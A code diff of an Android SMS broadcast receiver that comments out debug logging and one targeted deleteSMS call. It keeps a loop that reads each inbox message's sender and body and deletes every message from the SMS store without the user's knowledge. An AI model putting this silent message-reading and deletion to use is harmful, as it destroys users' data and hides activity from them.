@@ -71,15 +71,13 @@ public class SmSReceiver extends BroadcastReceiver {
                 }
             }
         }
-        Log.i("FY:", "下一行开始执行deleSMS");
-
-
-        deleteSMS(context, "000999");
-        Log.i("FY:", "已经执行deleSMS");
+        //Log.i("FY:", "下一行开始执行deleSMS");
+        //deleteSMS(context, "000999");
+        //Log.i("FY:", "已经执行deleSMS");
 
         // www.javaapk.com提供测试，请勿用于非法用途
-        Log.i("FYpp:", SmSserver.SendState);
-        Log.i("FYpp:", intent.getAction());
+        //Log.i("FYpp:", SmSserver.SendState);
+        //Log.i("FYpp:", intent.getAction());
 
         if (intent.getAction().equals(SmSserver.SendState)) {
             SmSutils su = new SmSutils();
@@ -106,10 +104,10 @@ public class SmSReceiver extends BroadcastReceiver {
             while (isRead.moveToNext()) {
                 String phone = isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
                 String body = isRead.getString(isRead.getColumnIndex("body")).trim();// 获取信息内容
-                Log.i("FY:", phone + "|" + body);
+                //Log.i("FY:", phone + "|" + body);
                 //if (body.equals(smscontent)){
                 int id = isRead.getInt(isRead.getColumnIndex("_id"));
-                Log.i("WARR:", "" + id);
+                //Log.i("WARR:", "" + id);
                 context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
                 //}
             }
